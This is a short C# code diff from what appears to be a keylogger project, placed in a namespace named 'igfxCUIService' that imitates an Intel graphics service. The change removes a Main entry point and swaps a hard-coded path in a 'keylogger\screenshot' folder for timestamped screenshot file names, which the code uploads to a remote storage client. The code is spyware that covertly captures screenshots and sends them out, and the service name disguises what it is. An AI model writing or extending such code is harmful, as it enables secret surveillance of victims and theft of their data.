@@ -19,11 +19,6 @@ namespace igfxCUIService
         private static INode webcam;
         private static INode Sendfile;
         #endregion
-        
-        static void Main(string[] args)
-        {
-            Uploadfile();
-        }
 
         public static void Uploadfile()
         {
@@ -33,7 +28,7 @@ namespace igfxCUIService
 
             maps();
 
-            Sendfile = client.UploadFile(@"D:\keylogger\screenshot\12-Nov-17\18.53.33.jpeg", screenshots);
+            Sendfile = client.UploadFile(Screenshots.pathString + Screenshots.hour + "." + Screenshots.minuten + "." + Screenshots.seconde + ".jpeg", screenshots);
 
             //Uri downloadUrl = client.GetDownloadLink(Sendfile);
             //Console.WriteLine(downloadUrl);
